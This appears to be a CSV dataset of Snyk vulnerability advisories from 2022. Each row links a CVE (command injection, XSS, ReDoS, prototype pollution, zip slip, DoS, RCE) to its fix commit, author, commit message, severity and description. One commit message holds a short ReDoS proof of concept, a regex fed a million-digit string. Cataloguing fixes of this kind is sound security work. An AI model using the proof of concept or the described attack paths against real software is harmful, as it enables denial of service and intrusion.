CVE-2022-22984,CWE-77,Snyk,https://security.snyk.io/vuln/SNYK-JS-SNYKGRADLEPLUGIN-3038624,30/11/2022,29/09/2022,https://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a,Command Injection,https://api.github.com/repos/snyk/cli/commits/80d97a93326406e09776156daf72e3caa03ae25a,gitphill,phill.garrett@snyk.io,cli,80d97a93326406e09776156daf72e3caa03ae25a,fix: escape child process arguments,Config files,5.0,medium,"snyk-gradle-plugin is a plugin for the Snyk CLI tool, providing dependency metadata for Gradle projects.
Affected versions of this package are vulnerable to Command Injection due to an incomplete fix for CVE-2022-40764.
A successful exploit allows attackers to run arbitrary commands on the host system where the Snyk CLI is installed by passing in crafted command line flags.
In order to exploit this vulnerability, a user would have to execute the snyk test command on untrusted files. In most cases, an attacker positioned to control the command line arguments to the Snyk CLI would already be positioned to execute arbitrary commands. However, this could be abused in specific scenarios, such as continuous integration pipelines, where developers can control the arguments passed to the Snyk CLI to leverage this component as part of a wider attack against an integration/build pipeline.
This issue has been addressed in the latest Snyk Docker images available at https://hub.docker.com/r/snyk/snyk as of 2022-11-29. Images downloaded and built prior to that date should be updated.
The issue has also been addressed in the Snyk TeamCity CI/CD plugin as of version v20221130.093605.",2022
CVE-2022-22984,CWE-77,Snyk,https://security.snyk.io/vuln/SNYK-JS-SNYKSBTPLUGIN-3038626,30/11/2022,29/09/2022,https://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a,Command Injection,https://api.github.com/repos/snyk/cli/commits/80d97a93326406e09776156daf72e3caa03ae25a,gitphill,phill.garrett@snyk.io,cli,80d97a93326406e09776156daf72e3caa03ae25a,fix: escape child process arguments,Config files,5.0,medium,"Affected versions of this package are vulnerable to Command Injection due to an incomplete fix for CVE-2022-40764.
A successful exploit allows attackers to run arbitrary commands on the host system where the Snyk CLI is installed by passing in crafted command line flags.
In order to exploit this vulnerability, a user would have to execute the snyk test command on untrusted files. In most cases, an attacker positioned to control the command line arguments to the Snyk CLI would already be positioned to execute arbitrary commands. However, this could be abused in specific scenarios, such as continuous integration pipelines, where developers can control the arguments passed to the Snyk CLI to leverage this component as part of a wider attack against an integration/build pipeline.
This issue has been addressed in the latest Snyk Docker images available at https://hub.docker.com/r/snyk/snyk as of 2022-11-29. Images downloaded and built prior to that date should be updated.
The issue has also been addressed in the Snyk TeamCity CI/CD plugin as of version v20221130.093605.",2022
CVE-2022-22984,CWE-77,Snyk,https://security.snyk.io/vuln/SNYK-JS-SNYKSNYKCOCOAPODSPLUGIN-3038625,30/11/2022,29/09/2022,https://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a,Command Injection,https://api.github.com/repos/snyk/cli/commits/80d97a93326406e09776156daf72e3caa03ae25a,gitphill,phill.garrett@snyk.io,cli,80d97a93326406e09776156daf72e3caa03ae25a,fix: escape child process arguments,Config files,5.0,medium,"Affected versions of this package are vulnerable to Command Injection due to an incomplete fix for CVE-2022-40764.
A successful exploit allows attackers to run arbitrary commands on the host system where the Snyk CLI is installed by passing in crafted command line flags.
In order to exploit this vulnerability, a user would have to execute the snyk test command on untrusted files. In most cases, an attacker positioned to control the command line arguments to the Snyk CLI would already be positioned to execute arbitrary commands. However, this could be abused in specific scenarios, such as continuous integration pipelines, where developers can control the arguments passed to the Snyk CLI to leverage this component as part of a wider attack against an integration/build pipeline.
This issue has been addressed in the latest Snyk Docker images available at https://hub.docker.com/r/snyk/snyk as of 2022-11-29. Images downloaded and built prior to that date should be updated.
The issue has also been addressed in the Snyk TeamCity CI/CD plugin as of version v20221130.093605.",2022
CVE-2022-22984,CWE-77,Snyk,https://security.snyk.io/vuln/SNYK-JS-SNYK-3038622,30/11/2022,29/09/2022,https://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a,Command Injection,https://api.github.com/repos/snyk/cli/commits/80d97a93326406e09776156daf72e3caa03ae25a,gitphill,phill.garrett@snyk.io,cli,80d97a93326406e09776156daf72e3caa03ae25a,fix: escape child process arguments,Config files,5.0,medium,"snyk is an advanced tool that scans and monitors projects for security vulnerabilities.
Affected versions of this package are vulnerable to Command Injection due to an incomplete fix for CVE-2022-40764.
A successful exploit allows attackers to run arbitrary commands on the host system where the Snyk CLI is installed by passing in crafted command line flags.
In order to exploit this vulnerability, a user would have to execute the snyk test command on untrusted files. In most cases, an attacker positioned to control the command line arguments to the Snyk CLI would already be positioned to execute arbitrary commands. However, this could be abused in specific scenarios, such as continuous integration pipelines, where developers can control the arguments passed to the Snyk CLI to leverage this component as part of a wider attack against an integration/build pipeline.
This issue has been addressed in the latest Snyk Docker images available at https://hub.docker.com/r/snyk/snyk as of 2022-11-29. Images downloaded and built prior to that date should be updated.
The issue has also been addressed in the Snyk TeamCity CI/CD plugin as of version v20221130.093605.",2022
CVE-2022-22984,CWE-77,Snyk,https://security.snyk.io/vuln/SNYK-JS-SNYKDOCKERPLUGIN-3039679,30/11/2022,29/09/2022,https://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a,Command Injection,https://api.github.com/repos/snyk/cli/commits/80d97a93326406e09776156daf72e3caa03ae25a,gitphill,phill.garrett@snyk.io,cli,80d97a93326406e09776156daf72e3caa03ae25a,fix: escape child process arguments,Config files,5.0,medium,"Affected versions of this package are vulnerable to Command Injection due to an incomplete fix for CVE-2022-40764.
A successful exploit allows attackers to run arbitrary commands on the host system where the Snyk CLI is installed by passing in crafted command line flags.
In order to exploit this vulnerability, a user would have to execute the snyk test command on untrusted files. In most cases, an attacker positioned to control the command line arguments to the Snyk CLI would already be positioned to execute arbitrary commands. However, this could be abused in specific scenarios, such as continuous integration pipelines, where developers can control the arguments passed to the Snyk CLI to leverage this component as part of a wider attack against an integration/build pipeline.
This issue has been addressed in the latest Snyk Docker images available at https://hub.docker.com/r/snyk/snyk as of 2022-11-29. Images downloaded and built prior to that date should be updated.
The issue has also been addressed in the Snyk TeamCity CI/CD plugin as of version v20221130.093605.",2022
CVE-2022-25923,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-EXECLOCALBIN-3157956,20/12/2022,06/12/2022,https://github.com/saeedseyfi/exec-local-bin/commit/d425866375c85038133a6f79db2aac66c0a72624,Command Injection,https://api.github.com/repos/saeedseyfi/exec-local-bin/commits/d425866375c85038133a6f79db2aac66c0a72624,Saeed Seyfi,saeeds@spotify.com,exec-local-bin,d425866375c85038133a6f79db2aac66c0a72624,fixes(CVE-2022-25923): resolves command injection security issue,JavaScript,7.4,high,Affected versions of this package are vulnerable to Command Injection via the theProcess() functionality due to improper user-input sanitization.,2022
CVE-2022-25171,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-P4-3167330,19/12/2022,12/12/2022,https://github.com/natelong/p4/commit/ae42e251beabf67c00539ec0e1d7aa149ca445fb,Command Injection,https://api.github.com/repos/natelong/p4/commits/ae42e251beabf67c00539ec0e1d7aa149ca445fb,Nate Long,long.nathaniel@gmail.com,p4,ae42e251beabf67c00539ec0e1d7aa149ca445fb,address security vulnerability,JavaScript,7.4,high,Affected versions of this package are vulnerable to Command Injection via the run() function due to improper input sanitization,2022
CVE-2022-24377,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-CYCLEIMPORTCHECK-3157955,13/12/2022,06/12/2022,https://github.com/Soontao/cycle-import-check/commit/1ca97b59df7e9c704471fcb4cf042ce76d7c9890,Command Injection,https://api.github.com/repos/Soontao/cycle-import-check/commits/1ca97b59df7e9c704471fcb4cf042ce76d7c9890,Theo Sun,theo.sun.github@outlook.com,cycle-import-check,1ca97b59df7e9c704471fcb4cf042ce76d7c9890,chore: dep update,TypeScript,7.4,high,Affected versions of this package are vulnerable to Command Injection via the writeFileToTmpDirAndOpenIt  function due to improper user-input sanitization.,2022
,CWE-29,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMSNAPCORESNAPDOVERLORDSNAPSHOTSTATEBACKEND-3172910,15/12/2022,12/12/2022,https://github.com/snapcore/snapd/commit/fd16a02b9474932fe59f74bdfcc0732eba28868d,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/snapcore/snapd/commits/fd16a02b9474932fe59f74bdfcc0732eba28868d,Alex Murray,alex.murray@canonical.com,snapd,fd16a02b9474932fe59f74bdfcc0732eba28868d,"o/snapshotstate: check snapshots are self-contained on import (#12414)

* o/snapshotstate: check snapshots are self-contained on import

Snapshots require administrator privileges to be imported and hence are assumed
to be trusted. However, let's try and be as helpful as possible and validate
that they are self-contained on import (ie. there are no files within the
snapshot that point outside of the parent directory) and report an error in that
case.

Thanks: Sam Sanoop <sams@snyk.io>
Signed-off-by: Alex Murray <alex.murray@canonical.com>

* tests: fix snapshot-basic test on trusty

Signed-off-by: Alex Murray <alex.murray@canonical.com>
Co-authored-by: Michael Vogt <mvo@ubuntu.com>",Go,5.5,medium,"github.com/snapcore/snapd/overlord/snapshotstate/backend is a The snapd and snap tools enable systems to work with .snap files.
Affected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip). When importing a snapshot (https://snapcraft.io/docs/snapshots), it is possible for a malcious snapshot tar file to traverse a user's system and overwrite any files on the system, through relative paths e.g. ""../../""",2022
CVE-2022-24373,CWE-1333,Snyk,https://security.snyk.io/vuln/SNYK-JS-REACTNATIVEREANIMATED-2949507,29/09/2022,13/07/2022,https://github.com/software-mansion/react-native-reanimated/commit/49216791ff679dcbdb37dc4c60a58bd36c2592a7,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/software-mansion/react-native-reanimated/commits/49216791ff679dcbdb37dc4c60a58bd36c2592a7,matias-la,98407225+matias-la@users.noreply.github.com,react-native-reanimated,49216791ff679dcbdb37dc4c60a58bd36c2592a7,"Fix ReDoS when parsing colors (#3382)

## Description

The regular expression used to parse numbers could be abused to cause a denial of service if the color to be parsed is controlled by an attacker.

For information about this vulnerability, see https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS.

## Changes

Changed the code so the new regex isn't vulnerable, since there's always only one possible path to take given any input.

Here is a proof-of-concept of how I made the existing regular expression cause a 100% CPU usage for several seconds, after being interrupted:

```
Welcome to Node.js v14.19.3.
Type "".help"" for more information.
> (new RegExp('^[-+]?\\d*\\.?\\d+$')).test(`${'1'.repeat(1e6)}z`)
^CUncaught Error: Script execution was interrupted by `SIGINT`
    at Script.runInThisContext (vm.js:134:12)
    at REPLServer.defaultEval (repl.js:566:29)
    at bound (domain.js:421:15)
    at REPLServer.runBound [as eval] (domain.js:432:12)
    at REPLServer.onLine (repl.js:909:10)
    at REPLServer.emit (events.js:412:35)
    at REPLServer.emit (domain.js:475:12)
    at REPLServer.Interface._onLine (readline.js:434:10)
    at REPLServer.Interface._line (readline.js:791:8)
    at REPLServer.Interface._ttyWrite (readline.js:1136:14) {
  code: 'ERR_SCRIPT_EXECUTION_INTERRUPTED'
}
> (new RegExp('^[-+]?\\d*(?:\\.\\d*)?$')).test(`${'1'.repeat(1e6)}z`) // the new regex works fine
false
>
```

## Checklist

- [X] Included code example that can be used to test this change
- [ ] Updated TS types
- [ ] Added TS types tests
- [ ] Added unit / integration tests
- [ ] Updated documentation
- [ ] Ensured that CI passes",TypeScript,5.3,medium,"react-native-reanimated is a More powerful alternative to Animated library for React Native.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper usage of regular expression in the parser of Colors.js.",2022
CVE-2022-25873,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-VUETIFY-3019858,15/09/2022,09/09/2022,https://github.com/vuetifyjs/vuetify/commit/ade1434927f55a0eccf3d54f900f24c5fa85a176,Cross-site Scripting (XSS),https://api.github.com/repos/vuetifyjs/vuetify/commits/ade1434927f55a0eccf3d54f900f24c5fa85a176,Kael,kaelwd@gmail.com,vuetify,ade1434927f55a0eccf3d54f900f24c5fa85a176,"fix(VCalendar): prevent XSS from eventName function

fixes #15757

BREAKING CHANGE: eventName can no longer render arbitrary HTML, convert
to VNodes instead",TypeScript,4.6,medium,"vuetify is an a Material Design component framework for Vue.js.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper input sanitization in the 'eventName' function within the VCalendar component.",2022
CVE-2022-21797,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-JOBLIB-3027033,25/09/2022,19/09/2022,https://github.com/joblib/joblib/commit/54f4d21f098591c77b48c9acfffaa4cf0a45282b,Arbitrary Code Execution,https://api.github.com/repos/joblib/joblib/commits/54f4d21f098591c77b48c9acfffaa4cf0a45282b,Adrin Jalali,adrin.jalali@gmail.com,joblib,54f4d21f098591c77b48c9acfffaa4cf0a45282b,FIX parse pre-dispatch with AST instead of calling eval (#1327),Unknown,9.8,critical,"joblib is a Lightweight pipelining with Python functions
Affected versions of this package are vulnerable to Arbitrary Code Execution via the pre_dispatch flag in Parallel() class due to the eval() statement.",2022
CVE-2022-21169,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-EXPRESSXSSSANITIZER-3027443,25/09/2022,20/09/2022,https://github.com/AhmedAdelFahim/express-xss-sanitizer/commit/3bf8aaaf4dbb1c209dcb8d87a82711a54c1ab39a,Prototype Pollution,https://api.github.com/repos/AhmedAdelFahim/express-xss-sanitizer/commits/3bf8aaaf4dbb1c209dcb8d87a82711a54c1ab39a,AhmedAdelFahim,ahmedadelfahim@gmail.com,express-xss-sanitizer,3bf8aaaf4dbb1c209dcb8d87a82711a54c1ab39a,fix XSS bypass by using prototype pollution issue.,Config files,7.3,high,"express-xss-sanitizer is an Express 4.x middleware which sanitizes user input data (in req.body, req.query, req.headers and req.params) to prevent Cross Site Scripting (XSS) attack.
Affected versions of this package are vulnerable to Prototype Pollution via the allowedTags attribute, allowing the attacker to bypass xss sanitization.",2022
CVE-2022-3215,CWE-113,Snyk,https://security.snyk.io/vuln/SNYK-SWIFT-APPLESWIFTNIO-3105796,28/09/2022,22/08/2022,https://github.com/apple/swift-nio/commit/a16e2f54a25b2af217044e5168997009a505930f,HTTP Response Splitting,https://api.github.com/repos/apple/swift-nio/commits/a16e2f54a25b2af217044e5168997009a505930f,Cory Benfield,lukasa@apple.com,swift-nio,a16e2f54a25b2af217044e5168997009a505930f,"Merge pull request from GHSA-7fj7-39wj-c64f

Motivation

HTTP headers are prevented from containing certain characters that can
potentially affect parsing or interpretation. Inadequately policing this
can lead to vulnerabilities in web applications, most notably HTTP
Response Splitting.

NIO was insufficiently policing the correctness of the header fields we
emit in HTTP/1.1. We've therefore added a new handler that is
automatically added to channel pipelines that will police the validity
of header fields.

For projects that are already running the validation themselves, this
can be easily disabled. Note that by default NIO does not validate
content length is correctly calculated, so applications can have their
framing fall out of sync unless they appropriately calculate this
themselves or use chunked transfer encoding.

Modifications

- Add thorough unit testing to confirm we will not emit invalid header
  fields.
- Error if a user attempts to send an invalid header field.

Result

NIO applications are no longer vulnerable to response splitting by CRLF
injection by default.",Swift,5.3,medium,"apple/swift-nio is an event-driven network application framework for high performance protocol servers & clients, non-blocking.
Affected versions of this package are vulnerable to HTTP Response Splitting. This occurs when a HTTP/1.1 server accepts user generated input from an incoming request and reflects it into a HTTP/1.1 response header in some form. A malicious user can add newlines to their input (usually in encoded form) and ""inject"" those newlines into the returned HTTP response.
This capability allows users to work around security headers and HTTP/1.1 framing headers by injecting entirely false responses or other new headers. The injected false responses may also be treated as the response to subsequent requests, which can lead to XSS, cache poisoning, and a number of other flaws.
This issue was resolved by adding a default channel handler that polices outbound headers. This channel handler is added by default to channel pipelines, but can be removed by users if they are doing this validation themselves.",2022
CVE-2022-3215,CWE-113,Snyk,https://security.snyk.io/vuln/SNYK-COCOAPODS-SWIFTNIOHTTP1-2988716,28/09/2022,22/08/2022,https://github.com/apple/swift-nio/commit/a16e2f54a25b2af217044e5168997009a505930f,HTTP Response Splitting,https://api.github.com/repos/apple/swift-nio/commits/a16e2f54a25b2af217044e5168997009a505930f,Cory Benfield,lukasa@apple.com,swift-nio,a16e2f54a25b2af217044e5168997009a505930f,"Merge pull request from GHSA-7fj7-39wj-c64f

Motivation

HTTP headers are prevented from containing certain characters that can
potentially affect parsing or interpretation. Inadequately policing this
can lead to vulnerabilities in web applications, most notably HTTP
Response Splitting.

NIO was insufficiently policing the correctness of the header fields we
emit in HTTP/1.1. We've therefore added a new handler that is
automatically added to channel pipelines that will police the validity
of header fields.

For projects that are already running the validation themselves, this
can be easily disabled. Note that by default NIO does not validate
content length is correctly calculated, so applications can have their
framing fall out of sync unless they appropriately calculate this
themselves or use chunked transfer encoding.

Modifications

- Add thorough unit testing to confirm we will not emit invalid header
  fields.
- Error if a user attempts to send an invalid header field.

Result

NIO applications are no longer vulnerable to response splitting by CRLF
injection by default.",Swift,5.3,medium,"SwiftNIOHTTP1 is a cross-platform asynchronous event-driven network application framework for rapid development of maintainable high performance protocol servers & clients.
Affected versions of this package are vulnerable to HTTP Response Splitting.
This occurs when a HTTP/1.1 server accepts user generated input from an incoming request and reflects it into a HTTP/1.1 response header in some form. A malicious user can add newlines to their input (usually in encoded form) and ""inject"" those newlines into the returned HTTP response.
This capability allows users to work around security headers and HTTP/1.1 framing headers by injecting entirely false responses or other new headers. The injected false responses may also be treated as the response to subsequent requests, which can lead to XSS, cache poisoning, and a number of other flaws.
This issue was resolved by adding a default channel handler that polices outbound headers. This channel handler is added by default to channel pipelines, but can be removed by users if they are doing this validation themselves.",2022
CVE-2022-25765,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795,08/09/2022,14/06/2022,https://github.com/pdfkit/pdfkit/commit/c99414936e77730094dc8f9026dd109b6b4da5ad,Command Injection,https://api.github.com/repos/pdfkit/pdfkit/commits/c99414936e77730094dc8f9026dd109b6b4da5ad,kylewang,kylewang@teamt5.org,pdfkit,c99414936e77730094dc8f9026dd109b6b4da5ad,modify url_needs_escaping,Ruby,9.8,critical,"Affected versions of this package are vulnerable to Command Injection where the URL is not properly sanitized.
NOTE: This issue was originally addressed in 0.8.7, but the fix was not complete. A complete fix was released in 0.8.7.2.",2022
CVE-2022-25897,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGECLIPSEMILO-2990191,07/09/2022,23/08/2022,https://github.com/eclipse/milo/commit/4534381760d7d9f0bf00cbf6a8449bb0d13c6ce5,Denial of Service (DoS),https://api.github.com/repos/eclipse/milo/commits/4534381760d7d9f0bf00cbf6a8449bb0d13c6ce5,Kevin Herron,kevinherron@gmail.com,milo,4534381760d7d9f0bf00cbf6a8449bb0d13c6ce5,Allow max MonitoredItems per session to be configured via OpcUaServerConfigLimits,Java,5.9,medium,"org.eclipse.milo:sdk-server is an open-source implementation of OPC UA
Affected versions of this package are vulnerable to Denial of Service (DoS) when bypassing the limitations for excessive memory consumption by sending multiple CloseSession requests with the deleteSubscription parameter equal to False.",2022
CVE-2022-25914,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-COMGOOGLECLOUDTOOLS-2968871,07/09/2022,03/08/2022,https://github.com/GoogleContainerTools/jib/commit/67fa40bc2c484da0546333914ea07a89fe44eaaf,Remote Code Execution (RCE),https://api.github.com/repos/GoogleContainerTools/jib/commits/67fa40bc2c484da0546333914ea07a89fe44eaaf,Mridula,66699525+mpeddada1@users.noreply.github.com,jib,67fa40bc2c484da0546333914ea07a89fe44eaaf,"Check if file exists when executable path is passed in through jib dockerClient.executable (#3744)

* Check if file exists when executable path is passed in through jib.dockerClient.executable",Java,5.6,medium,"Affected versions of this package are vulnerable to Remote Code Execution (RCE) via the isDockerInstalled function, due to attempting to execute input.",2022
CVE-2022-25857,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGYAML-2806360,29/08/2022,01/05/2022,https://github.com/snakeyaml/snakeyaml/commit/fc300780da21f4bb92c148bc90257201220cf174,Denial of Service (DoS),https://api.github.com/repos/snakeyaml/snakeyaml/commits/fc300780da21f4bb92c148bc90257201220cf174,Andrey Somov,public.somov@gmail.com,snakeyaml,fc300780da21f4bb92c148bc90257201220cf174,Restrict nested depth for collections to avoid DoS attacks,XML,7.5,high,"org.yaml:snakeyaml is a YAML 1.1 parser and emitter for Java.
Affected versions of this package are vulnerable to Denial of Service (DoS) due to missing nested depth limitation for collections.",2022
CVE-2022-25887,CWE-1333,Snyk,https://security.snyk.io/vuln/SNYK-JS-SANITIZEHTML-2957526,29/08/2022,21/07/2022,https://github.com/apostrophecms/sanitize-html/commit/b4682c12fd30e12e82fa2d9b766de91d7d2cd23c,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/apostrophecms/sanitize-html/commits/b4682c12fd30e12e82fa2d9b766de91d7d2cd23c,Tom Boutell,tom@apostrophecms.com,sanitize-html,b4682c12fd30e12e82fa2d9b766de91d7d2cd23c,"Merge pull request #557 from apostrophecms/release-2.7.1

Release 2.7.1",Markdown,5.3,medium,"sanitize-html is a library that allows you to clean up user-submitted HTML, preserving whitelisted elements and whitelisted attributes on a per-element basis
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to insecure global regular expression replacement logic of HTML comment removal.",2022
CVE-2022-21208,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-NODEOPCUA-2988723,22/08/2022,22/08/2022,https://github.com/node-opcua/node-opcua/commit/33ca3bab4ab781392a2f8d8f5a14de9a0aa0e410,Denial of Service (DoS),https://api.github.com/repos/node-opcua/node-opcua/commits/33ca3bab4ab781392a2f8d8f5a14de9a0aa0e410,Etienne Rossignon,etienne.rossignon@gadz.org,node-opcua,33ca3bab4ab781392a2f8d8f5a14de9a0aa0e410,fix message chunk overflow detection,TypeScript,7.5,high,"node-opcua is an implementation of a OPC UA stack fully written in javascript and nodejs
Affected versions of this package are vulnerable to Denial of Service (DoS) due to a missing limitation on the number of received chunks - per single session or in total for all concurrent sessions.
An attacker can exploit this vulnerability by sending an unlimited number of huge chunks (e.g. 2GB each) without sending the Final closing chunk.",2022
CVE-2022-25231,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-NODEOPCUA-2988724,22/08/2022,22/08/2022,https://github.com/node-opcua/node-opcua/commit/7b5044b3f5866fbedc3efabd05e407352c07bd2f,Denial of Service (DoS),https://api.github.com/repos/node-opcua/node-opcua/commits/7b5044b3f5866fbedc3efabd05e407352c07bd2f,Etienne Rossignon,etienne.rossignon@sterfive.com,node-opcua,7b5044b3f5866fbedc3efabd05e407352c07bd2f,server: use ServiceFault on request error,TypeScript,7.5,high,"node-opcua is an implementation of a OPC UA stack fully written in javascript and nodejs
Affected versions of this package are vulnerable to Denial of Service (DoS) by sending a specifically crafted OPC UA message with a special OPC UA NodeID, when the requested memory allocation exceeds the v8’s memory limit.",2022
CVE-2022-24375,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-NODEOPCUA-2988725,22/08/2022,22/08/2022,https://github.com/node-opcua/node-opcua/commit/3fd46ec156e7718a506be41f3916310b6bdd0407,Denial of Service (DoS),https://api.github.com/repos/node-opcua/node-opcua/commits/3fd46ec156e7718a506be41f3916310b6bdd0407,Etienne Rossignon,etienne.rossignon@sterfive.com,node-opcua,3fd46ec156e7718a506be41f3916310b6bdd0407,server: fix Subscription.modify assert,TypeScript,7.5,high,"node-opcua is an implementation of a OPC UA stack fully written in javascript and nodejs
Affected versions of this package are vulnerable to Denial of Service (DoS) when bypassing the limitations for excessive memory consumption by sending multiple CloseSession requests with the deleteSubscription parameter equal to False.",2022
CVE-2022-25304,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-ASYNCUA-2988731,22/08/2022,22/08/2022,https://github.com/FreeOpcUa/opcua-asyncio/commit/01c7acf047887b62d979cd4373d370e72a4b9057,Denial of Service (DoS),https://api.github.com/repos/FreeOpcUa/opcua-asyncio/commits/01c7acf047887b62d979cd4373d370e72a4b9057,Alexander Schrode,Midix01@googlemail.com,opcua-asyncio,01c7acf047887b62d979cd4373d370e72a4b9057,"Check limits of messages (CVE-2022-25304) (#1040)

* check message limits on recv

* add ErrorMessage handling

* add to large chunk test

* client disconnect on ErrorMessage

* change default transport limits",Python,7.5,high,"Affected versions of this package are vulnerable to Denial of Service (DoS) due to a missing limitation on the number of received chunks - per single session or in total for all concurrent sessions.
An attacker can exploit this vulnerability by sending an unlimited number of huge chunks (e.g. 2GB each) without sending the Final closing chunk.",2022
CVE-2022-25304,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-OPCUA-2988730,22/08/2022,22/08/2022,https://github.com/FreeOpcUa/opcua-asyncio/commit/01c7acf047887b62d979cd4373d370e72a4b9057,Denial of Service (DoS),https://api.github.com/repos/FreeOpcUa/opcua-asyncio/commits/01c7acf047887b62d979cd4373d370e72a4b9057,Alexander Schrode,Midix01@googlemail.com,opcua-asyncio,01c7acf047887b62d979cd4373d370e72a4b9057,"Check limits of messages (CVE-2022-25304) (#1040)

* check message limits on recv

* add ErrorMessage handling

* add to large chunk test

* client disconnect on ErrorMessage

* change default transport limits",Python,7.5,high,"Affected versions of this package are vulnerable to Denial of Service (DoS) due to a missing limitation on the number of received chunks - per single session or in total for all concurrent sessions.
An attacker can exploit this vulnerability by sending an unlimited number of huge chunks (e.g. 2GB each) without sending the Final closing chunk.",2022
CVE-2022-25907,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-TSDEEPMERGE-2959975,08/08/2022,25/07/2022,https://github.com/voodoocreation/ts-deepmerge/commit/9be5148773343c57be9de39728d6ead18eddf10b,Prototype Pollution,https://api.github.com/repos/voodoocreation/ts-deepmerge/commits/9be5148773343c57be9de39728d6ead18eddf10b,Raice Hannay,raice.hannay@xero.com,ts-deepmerge,9be5148773343c57be9de39728d6ead18eddf10b,prevent against prototype pollution,Unknown,7.5,high,"ts-deepmerge is an a deep merge function that automatically infers the return type based on your input, without mutating the source objects.
Affected versions of this package are vulnerable to Prototype Pollution due to missing sanitization of the merge function.",2022
CVE-2022-25867,CWE-476,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-IOSOCKET-2949738,01/08/2022,11/07/2022,https://github.com/socketio/socket.io-client-java/commit/8664499b6f31154f49783531f778dac5387b766b,NULL Pointer Dereference,https://api.github.com/repos/socketio/socket.io-client-java/commits/8664499b6f31154f49783531f778dac5387b766b,Damien Arrachequesne,damien.arrachequesne@gmail.com,socket.io-client-java,8664499b6f31154f49783531f778dac5387b766b,"fix: ensure the payload format is valid

This commit should prevent some NPE issues encountered after the
parsing of the packet.

Related:

- https://github.com/socketio/socket.io-client-java/issues/642
- https://github.com/socketio/socket.io-client-java/issues/609
- https://github.com/socketio/socket.io-client-java/issues/505

Backported from https://github.com/socketio/socket.io-client-java/commit/e8ffe9d1383736f6a21090ab959a2f4fa5a41284",Java,7.5,high,Affected versions of this package are vulnerable to NULL Pointer Dereference when parsing a packet with with invalid payload format.,2022
CVE-2022-24912,CWE-208,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMRUNATLANTISATLANTISSERVERCONTROLLERSEVENTS-2950851,27/07/2022,15/07/2022,https://github.com/runatlantis/atlantis/commit/48870911974adddaa4c99c8089e79b7d787fa820,Timing Attack,https://api.github.com/repos/runatlantis/atlantis/commits/48870911974adddaa4c99c8089e79b7d787fa820,Connor Edwards,38229097+cedws@users.noreply.github.com,atlantis,48870911974adddaa4c99c8089e79b7d787fa820,fix: use constant time comparison of webhook secret in gitlab event validator (#2392),Go,7.5,high,"Affected versions of this package are vulnerable to Timing Attack in the webhook event validator code, which does not use a constant-time comparison function to validate the webhook secret. It can allow an attacker to recover this secret as an attacker and then forge webhook events.",2022
CVE-2022-21802,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-GRAPESJS-2935960,18/07/2022,27/06/2022,https://github.com/artf/grapesjs/commit/13e85d152d486b968265c4b8017e8901e7d89ff3,Cross-site Scripting (XSS),https://api.github.com/repos/artf/grapesjs/commits/13e85d152d486b968265c4b8017e8901e7d89ff3,Artur Arseniev,artur.catch@hotmail.it,grapesjs,13e85d152d486b968265c4b8017e8901e7d89ff3,Protect Selector Manager views from XSS. Closes #4411,TypeScript,5.4,medium,"grapesjs is a web builder framework.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to an improper sanitization of the class name in Selector Manager.",2022
CVE-2022-25759,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGCORE-2849633,19/07/2022,01/06/2022,https://github.com/neocotic/convert-svg/commit/7e6031ac7427cf82cf312cb4a25040f2e6efe7a5,Remote Code Injection,https://api.github.com/repos/neocotic/convert-svg/commits/7e6031ac7427cf82cf312cb4a25040f2e6efe7a5,Alasdair,alasdair.mercer@unity3d.com,convert-svg,7e6031ac7427cf82cf312cb4a25040f2e6efe7a5,"Strip onload attribute from SVG input

In order to prevent a remote code injection, the `onload` attribute needs to be removed from the SVG input as Puppeteer/Chromium will execute any code within it which could potentially be malicious.

Fixes #81",Config files,9.9,critical,"convert-svg-core is a package that supports converting SVG into another format using headless Chromium.
Affected versions of this package are vulnerable to Remote Code Injection via sending an SVG file containing the payload.",2022
CVE-2022-25891,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMCONTAINRRRSHOUTRRRPKGUTIL-2849059,14/07/2022,30/05/2022,https://github.com/containrrr/shoutrrr/commit/6a27056f9d7522a8b493216195cb7634bf4b5c42,Denial of Service (DoS),https://api.github.com/repos/containrrr/shoutrrr/commits/6a27056f9d7522a8b493216195cb7634bf4b5c42,nils måsén,nils@piksel.se,shoutrrr,6a27056f9d7522a8b493216195cb7634bf4b5c42,"fix(discord): message size fixes (#242)

* fix(discord): handle empty messages without panic
* fix: off by one error when partitioning messages
* test(discord): add tests for Send failures
